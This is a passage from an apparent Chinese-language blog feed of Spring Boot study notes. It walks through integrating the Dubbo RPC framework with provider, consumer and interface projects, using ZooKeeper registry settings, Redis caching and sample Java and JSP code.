class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在服务提供者（Provide）中创建该接口的实现类StudentServiceImpl.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.annotation.Service;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.mapper.StudentMapper;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.model.Student;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Service(interfaceName = &quot;com.bjpowernode.springboot.service.StudentService&quot;,version = &quot;1.0.0&quot;,timeout = 15000)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;Object,Object&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">queryStudentById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.selectByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">queryAllStudentCount</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提升系统性能,用户体验提升</span></span><br><span class="line">        <span class="comment">//首先去redis缓存中查询,如果有:直接使用,如果没有:去数据库查询并存放到redis缓存中</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">allStudentCount</span> <span class="operator">=</span> (Integer) redisTemplate.opsForValue().get(<span class="string">&quot;allStudentCount&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否有值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == allStudentCount) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去数据库查询</span></span><br><span class="line">            allStudentCount = studentMapper.selectAllStudentCount();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//并存放到redis缓存中</span></span><br><span class="line">            redisTemplate.opsForValue().set(<span class="string">&quot;allStudentCount&quot;</span>,allStudentCount,<span class="number">30</span>, TimeUnit.SECONDS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> allStudentCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em><strong>Last but not least</strong></em>，在Consumer项目工程文件中，在src&#x2F;main&#x2F;中创建webapp包，来存放jsp文件webapp&#x2F;studentDetail.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;学生详情&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;学生编号:$&#123;student.id&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;学生姓名:$&#123;student.name&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;学生年龄:$&#123;student.age&#125;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-运行Dubbo-SSM框架"><a href="#0x03-运行Dubbo-SSM框架" class="headerlink" title="0x03 运行Dubbo-SSM框架"></a>0x03 运行Dubbo-SSM框架</h2><p>同时构建，并启动三个项目：</p><ul><li>Maven接口项目工程</li><li>Springboot+Maven服务提供者（Provider）项目工程</li><li>Springboot+Maven服务消费者（Consumer）项目工程<br>打开浏览器，输入<a target="_blank" rel="noopener" href="http://localhost:8080/student/detail/1">http://localhost:8080/student/detail/1</a><br>浏览器输出：<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">学生编号：1</span><br><span class="line">学生姓名：222</span><br><span class="line">学生年龄：25</span><br></pre></td></tr></table></figure><strong>Dubbo-SSM框架搭建成功！congratulations！</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 10</title>
      <link href="/2021/08/14/ce8a38b3b2a5-q1jun/"/>
      <url>/2021/08/14/ce8a38b3b2a5-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot-学习笔记-10"><a href="#Spring-Boot-学习笔记-10" class="headerlink" title="Spring Boot 学习笔记 10"></a>Spring Boot 学习笔记 10</h1><h2 id="SpringBoot集成Dubbo-代码调试"><a href="#SpringBoot集成Dubbo-代码调试" class="headerlink" title="SpringBoot集成Dubbo 代码调试"></a>SpringBoot集成Dubbo 代码调试</h2><p>前一篇文章中，我们已经将 接口项目、消费者项目、提供者项目 配置完成，接下来就是写代码的事情了。<br>在Consumer项目的控制层中: StudentCOntroller.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.annotation.Reference;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.service.StudentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dubbo:reference interface=&quot;&quot; version=&quot;&quot; check=false</span></span><br><span class="line">    <span class="meta">@Reference(interfaceClass = StudentService.class,version = &quot;1.0.0&quot;,check = false)</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/count&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> Object <span class="title function_">studentCount</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">allStudentCount</span> <span class="operator">=</span> studentService.queryAllStudentCount();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;学生总人数为:&quot;</span>+allStudentCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时候我们用到的接口<code>private StudentService studentService;</code>并没有被创建，所以我们要创建一个 StudentService接口，但是我们并不在本项目中创建，而是移步到Interface项目中创建这个接口。<br>在Interface项目中的src&#x2F;java&#x2F;sample&#x2F;springboot&#x2F;中创建一个service包：service，包内创建一个接口类StudentService.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取学生总人数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Integer <span class="title function_">queryAllStudentCount</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口创建好了，那我们在哪实现这个接口呢？按照之前的做法我们应该是在Service这个包内创建一个新的包impl来存放接口实现类，但是在Dubbo中，我们把接口实现类归于提供者（Provider）项目。<br>在Provider项目中的src&#x2F;java&#x2F;sample&#x2F;springboot&#x2F;service&#x2F;中创建包impl，里面新建：StudentServiceImpl.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.annotation.Service;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.service.StudentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Service(interfaceClass = StudentService.class,version = &quot;1.0.0&quot;,timeout = 15000)</span></span><br><span class="line"><span class="comment">//dubbo:service interface=&quot;&quot; version=&quot;&quot; timeout=&quot;&quot;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">queryAllStudentCount</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用数据持久层</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1250</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注解@Component将接口实现类加载到Spring容器中，然后再用<code>com.alibaba.dubbo.config.annotation</code>包中的@Service注解，添加属性<strong>interfaceClass</strong> &#x3D; StudentService.class ,<strong>version</strong> &#x3D; “1.0.0” , <strong>timeout</strong> &#x3D; 15000，<br>这些注解就是dubbo中添加的dubbo:service interface&#x3D;”” version&#x3D;”” timeout&#x3D;””标签。</p><p>配置好这个注解，这个接口就暴露出来了，然后就可以在消费者项目中进行引用了。</p><p>在Consumer项目中的StudentController.java中添加的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dubbo:reference interface=&quot;&quot; version=&quot;&quot; check=false</span></span><br><span class="line">    <span class="meta">@Reference(interfaceClass = StudentService.class,version = &quot;1.0.0&quot;,check = false)</span></span><br></pre></td></tr></table></figure><p>这就是引用接口的注解__@Reference()__，内容为<strong>interfaceClass</strong> &#x3D; StudentService.class,<strong>version</strong> &#x3D; “1.0.0”,<strong>check</strong> &#x3D; false，这些注解就是dubbo中添加的dubbo:reference interface&#x3D;”” version&#x3D;”” check&#x3D;false标签。</p><p>完成代码配置后还需要在入口类添加启动Dubbo的注解：</p><ul><li>Provider项目：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.spring.boot.annotation.EnableDubboConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span>      <span class="comment">//开启spring配置</span></span><br><span class="line"><span class="meta">@EnableDubboConfiguration</span>   <span class="comment">//开启dubbo配置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Consumer 项目:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.spring.boot.annotation.EnableDubboConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span>  <span class="comment">//开启spring注解配置</span></span><br><span class="line"><span class="meta">@EnableDubboConfiguration</span>   <span class="comment">//开启dubbo配置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成搭建后启动各个项目，然后在浏览器完成测试！</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 09</title>
      <link href="/2021/08/12/54a344a129d5-q1jun/"/>
      <url>/2021/08/12/54a344a129d5-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Dubbo3-简介"><a href="#0x01-Dubbo3-简介" class="headerlink" title="0x01 Dubbo3 简介"></a>0x01 Dubbo3 简介</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Apache</span> Dubbo 是一款微服务开发框架，它提供了 RPC通信 与 微服务治理 两大关键能力。这意味着，使用 Dubbo 开发的微服务，将具备相互之间的远程发现与通信能力， 同时利用 Dubbo 提供的丰富服务治理能力，可以实现诸如服务发现、负载均衡、流量调度等服务治理诉求。同时 Dubbo 是高度可扩展的，用户几乎可以在任意功能点去定制自己的实现，以改变框架的默认行为来满足自己的业务需求。</span><br></pre></td></tr></table></figure><blockquote><p>Dubbo3 基于 Dubbo2 演进而来，在保持原有核心功能特性的同时， Dubbo3 在易用性、超大规模微服务实践、云原生基础设施适配等几大方向上进行了全面升级。 以下文档都将基于 Dubbo3 展开。</p></blockquote><h2 id="0x02-What-is-Dubbo"><a href="#0x02-What-is-Dubbo" class="headerlink" title="0x02 What is Dubbo?"></a>0x02 What is Dubbo?</h2><p>如开篇所述，Dubbo 提供了构建云原生微服务业务的一站式解决方案，可以使用 Dubbo 快速定义并发布微服务组件，同时基于 Dubbo 开箱即用的丰富特性及超强的扩展能力，构建运维整个微服务体系所需的各项服务治理能力，如 Tracing、Transaction 等，Dubbo 提供的基础能力包括：</p><ul><li>服务发现</li><li>流式通信</li><li>负载均衡</li><li>流量治理</li><li>…..</li></ul><p>Dubbo 计划提供丰富的多语言客户端实现，其中 Java、Golang 版本是当前稳定性、活跃度最好的版本，其他多语言客户端[]正在持续建设中。</p><p>自开源以来，Dubbo 就被一众大规模互联网、IT公司选型，经过多年企业实践积累了大量经验。Dubbo3 是站在巨人肩膀上的下一代产品，它汲取了上一代的优点并针对已知问题做了大量优化，因此，Dubbo 在解决业务落地与规模化实践方面有着无可比拟的优势：</p><ul><li>开箱即用<ul><li>易用性高，如 Java 版本的面向接口代理特性能实现本地透明调用</li><li>功能丰富，基于原生库或轻量扩展即可实现绝大多数的微服务治理能力</li></ul></li><li>超大规模微服务集群实践<ul><li>高性能的跨进程通信协议</li><li>地址发现、流量治理层面，轻松支持百万规模集群实例</li></ul></li><li>企业级微服务治理能力<ul><li>服务测试</li><li>服务Mock</li></ul></li></ul><p>Dubbo3 是在云原生背景下诞生的，使用 Dubbo 构建的微服务遵循云原生思想，能更好的复用底层云原生基础设施、贴合云原生微服务架构。这体现在：</p><ul><li>服务支持部署在容器、Kubernetes平台，服务生命周期可实现与平台调度周期对齐；</li><li>支持经典 Service Mesh 微服务架构，引入了 Proxyless Mesh 架构，进一步简化 Mesh 的落地与迁移成本，提供更灵活的选择；</li><li>作为桥接层，支持与 SpringCloud、gRPC 等异构微服务体系的互调互通</li></ul><blockquote><p>Apache Dubbo官网：<a target="_blank" rel="noopener" href="https://dubbo.apache.org/">https://dubbo.apache.org/</a></p></blockquote><h2 id="0x02-SpringBoot-集成Dubbo分布式框架"><a href="#0x02-SpringBoot-集成Dubbo分布式框架" class="headerlink" title="0x02 SpringBoot 集成Dubbo分布式框架"></a>0x02 SpringBoot 集成Dubbo分布式框架</h2><ol><li>接口工程： 存放实体bean和业务接口</li><li>服务提供者： 业务接口的实现类并将服务暴露且注册到注册中心，调用数据持久层<ul><li>添加依赖（dubbo，注册中心，接口工程）</li><li>配置服务提供者核心配置文件</li></ul></li><li>服务消费者： 处理浏览器客户端发送的请求，从注册中心调用服务提供者所提供的服务<ul><li>添加依赖（dubbo，注册中心，接口工程）</li><li>配置服务消费者核心配置文件</li></ul></li></ol><p>首先我们要创建：接口工程项目文件<strong>Interface</strong>(maven)、提供者项目文件<strong>Provider</strong>(springboot)、消费者项目文件<strong>Consumer</strong>(springboot)。</p><p>在Provider项目Pom.xml中添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Dubbo集成SpringBoot框架起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注册中心--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--接口工程(我们所创建的接口工程项目地址)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.bjpowernode.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>020-springboot-dubbo-interface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Provider项目的核心配置文件 application.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置内嵌Tomcat端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="comment">#设置上下文根</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置dubbo的配置</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">021-springboot-dubbo-provider</span></span><br><span class="line"><span class="comment">#当前工程是一个服务提供者</span></span><br><span class="line"><span class="attr">spring.dubbo.server</span>=<span class="string">true</span></span><br><span class="line"><span class="comment">#设置注册中心</span></span><br><span class="line"><span class="attr">spring.dubbo.registry</span>=<span class="string">zookeeper://127.0.0.1:2181</span></span><br></pre></td></tr></table></figure><p>接下来是Consumer消费者项目工程，在Pom.xml中添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--Dubbo集成SpringBoot框架起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注册中心--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--接口工程--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.bjpowernode.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>020-springboot-dubbo-interface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Consumer项目的核心配置文件 application.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置内嵌Tomcat端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置dubbo配置</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">022-springboot-dubbo-consumer</span></span><br><span class="line"><span class="comment">#指定注册中心</span></span><br><span class="line"><span class="attr">spring.dubbo.registry</span>=<span class="string">zookeeper://127.0.0.1:2181</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 08</title>
      <link href="/2021/08/11/47fcabd36603-q1jun/"/>
      <url>/2021/08/11/47fcabd36603-q1jun/</url>
      
